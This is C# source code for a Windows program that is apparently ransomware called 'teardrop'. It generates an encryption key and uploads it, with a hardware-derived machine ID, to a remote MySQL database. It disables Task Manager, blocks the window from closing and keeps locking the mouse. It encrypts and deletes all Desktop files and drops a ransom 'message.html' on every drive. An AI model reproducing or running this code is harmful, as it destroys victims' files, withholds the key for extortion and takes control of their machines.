using DeviceId;
using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace teardrop
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public void Log(string text, string title)
        {
            try
            {
                if (File.Exists(Application.StartupPath + "\\log.txt"));
                {
                    string prefix = "[" + DateTime.Now + "] ";
                    File.AppendAllText(Application.StartupPath + "\\log.txt", prefix + text + Environment.NewLine);
                }
            } catch { }
        }


        private void Form1_Load(object sender, EventArgs e)
        {           
            // Check if Encryption/Decryption Key was ever created on that machine
            if(Properties.Settings.Default.key.Length != 34)
            {
                Properties.Settings.Default.key = Crypto.GetRandomString(34);
                Properties.Settings.Default.Save();
                Properties.Settings.Default.Reload();

                write("Generated key: " + Properties.Settings.Default.key);

            }
            else
            {
                write("Key is: " + Properties.Settings.Default.key);
            }

            // If disable_taskmgr is true, disable task manager. else, enable.
            if (Properties.Settings.Default.disable_taskmgr == true)
            {
                try
                {
                    DisableTaskManager();
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "Form1_Load > DisableTaskManager");
                }
            }
            else
            {
                try
                {
                    EnableTaskManager();
                }
                catch (Exception ex)
                {
                    Log(ex.Message, "Form1_Load > EnableTaskManager");
                }
            }


            // Simple "Styling"
            this.ShowInTaskbar = false;
            this.Text = "";
            this.ShowIcon = false;
            //this.TopMost = true;

            
            timer1.Enabled = true;
            timer1.Start();

            label1.Text = Properties.Settings.Default.application_title;

            // Center Visuals
            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
            label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);

            string deviceId = "";

            try
            {
                // Generate Devive ID for Database to identify encrypted machines
                deviceId = new DeviceIdBuilder()
                    .AddMachineName()
                    .AddProcessorId()
                    .AddMotherboardSerialNumber()
                    .AddSystemDriveSerialNumber()
                    .ToString();
            }
            catch(Exception DeviceIdError)
            {
                Log(DeviceIdError.Message, "Form1_Load > DevideId");
            }

            string myConnectionString = "SERVER=" + Properties.Settings.Default.db_host + ";" +
                            "DATABASE=" + Properties.Settings.Default.db_database + ";" +
                            "UID=" + Properties.Settings.Default.db_user + ";" +
                            "PASSWORD=" + Properties.Settings.Default.db_pass + ";";



            if(Properties.Settings.Default.db_enable == true)
            {
                try
                {
                    MySqlConnection connection = new MySqlConnection(myConnectionString);
                    MySqlCommand command = connection.CreateCommand();
                    command.CommandText = "INSERT INTO machine (deviceID,pass) VALUES ('" + deviceId + "', '" + Properties.Settings.Default.key + "')";
                    MySqlDataReader Reader;
                    connection.Open();
                    Reader = command.ExecuteReader();
                    while (Reader.Read())
                    {
                        string row = "";
                        for (int i = 0; i < Reader.FieldCount; i++)
                            row += Reader.GetValue(i).ToString() + ", ";
                        Console.WriteLine(row);
                    }
                    connection.Close();
                }
                catch (Exception ex)
                {
                    if (ex.Message.Contains("DUPLICATE"))
                    {

                    }
                    else
                    {
                        Log(ex.Message, "Form1_Load > MySQL");
                    }
                }
            }


            Task.Run(() => GetFiles());
        }

        public void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            }
            objRegistryKey.Close();
        }

        public void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
            {
                objRegistryKey.DeleteValue("DisableTaskMgr");
            }
            objRegistryKey.Close();
        }

        public void write(string text)
        {
            if (textBox1.InvokeRequired)
            {
                textBox1.Invoke(new Action<string>(write), new object[] { text });
                return;
            }
            textBox1.AppendText(text + Environment.NewLine);
        }

        string[] file;
        private void ShowAllFoldersUnder(string path, int indent)
        {
            try
            {
                if ((File.GetAttributes(path) & FileAttributes.ReparsePoint)
                    != FileAttributes.ReparsePoint)
                {
                    foreach (string folder in Directory.GetDirectories(path))
                    {
                        if (!folder.Contains("System Volume Information"))
                        {
                            try
                            {
                                file = Directory.GetFiles(Path.GetFullPath(folder));
                            }
                            catch (Exception ex) { write(ex.Message); }

                            foreach (string s in file)
                            {
                                string ext = Path.GetExtension(s);
                                var validExtensions = new[]
                                {
                                ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav", ".pdf", ".raw", ".bat", ".json", ".doc", ".txt", ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip", ".7zip",
                                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".xhtml", ".odt", ".ods", ".wma",
                                ".wav", ".mpa", ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz", ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
                                ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb", "java", ".cpp"
                            };

                                // "skipPath" is experimental and currently not working
                                var skipPath = new[]
                                {
                                "System32", "WinSxS", "Program Files"
                            };

                                if (validExtensions.Contains(ext.ToLower()))
                                {
                                    //Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));

                                    try
                                    {
                                        //File.Delete(s);
                                    }
                                    catch (Exception ex2)
                                    {
                                        write("Cant delete file " + ex2.Message);
                                        Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
                                    }

                                    write("Encrypted " + s);
                                }

                            }
                        }

                        ShowAllFoldersUnder(folder, indent + 2);
                    }
                }
            }
            catch (Exception e) { write(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error"); }
            
        }

        public void GetFiles()
        {
            try
            {
                // Encrypt Desktop Files first!
                string[] desktopFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories);
                foreach(string s in desktopFiles)
                {
                    try
                    {
                        if (!s.Contains(Properties.Settings.Default.extension) && !s.Contains("Sytem Volume Information"))
                        {
                            Task.Run(() => Crypto.FileEncrypt(s, Properties.Settings.Default.key));
                            write("Encrypted " + s);

                            try
                            {
                                File.Delete(s);
                            }
                            catch (Exception ex2)
                            {
                                write("Cant delete file " + ex2.Message);
                                Log(ex2.Message, "GetFiles > File Delete Error");
                            }
                        }
                        else
                        {

                        }
                    }
                    catch (Exception ex)
                    {
                        Log(ex.Message, "Getfiles > General Error");
                    }
                }

                // Now Encrypt whole hard drive
                foreach (var drive in DriveInfo.GetDrives())
                {

                    // This will try to create message in eighter plain text file or html file.
                    try
                    {
                        if(Properties.Settings.Default.message.Length > 0)
                        {
                            File.WriteAllText(drive.Name + "\\message.html", Properties.Settings.Default.message);
                            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\message.html", Properties.Settings.Default.message);

                            write("Created File message.html on drive " + drive.Name + "\\message");
                            Log("File 'message.html' created on drive " + drive.Name + "\\message.html", "GetFiles > Check Message Settings");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log(ex.Message, "GetFiles > Create Message File");
                        write(ex.Message);
                    }


                    try
                    {
                        write("Found drive " + drive.Name);
                        Log("Found drive " + drive.Name, "GetFiles > Drive State Check");

                        try
                        {
                            if (drive.IsReady)
                            {
                                ShowAllFoldersUnder(drive.Name, 0);
                            }
                            else
                            {
                                Log("Found drive " + drive.Name + " , but it's not ready.", "GetFiles > Drive State Check");
                                write("Found drive " + drive.Name + " , but it's not ready.");
                            }
                        }
                        catch { }
                    }
                    catch (Exception ex1)
                    {
                        write("ex1 " + ex1.Message);
                        Log(ex1.Message, "GetFiles > Drive Error");
                    }
                }
            }
            catch(Exception ex)
            {
                Log(ex.Message, "GetFiles > General Drive Error");
            }

            write("Done getting stuff :)");
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        public void DoMouseClick()
        {
            uint X = (uint)Screen.PrimaryScreen.WorkingArea.Width / 2;
            uint Y = (uint)Screen.PrimaryScreen.WorkingArea.Height / 2;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Point screenPos = System.Windows.Forms.Cursor.Position;
            Point leftTop = new System.Drawing.Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
            Cursor.Position = leftTop;

            // If mouse click is enabled (set to "true" in Project Settings) , the mouse will be clicked each intervall. 
            // This might be a work around for diabling ALT + Tab etc...
            if (Properties.Settings.Default.clickMouse == true)
            {
                DoMouseClick();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
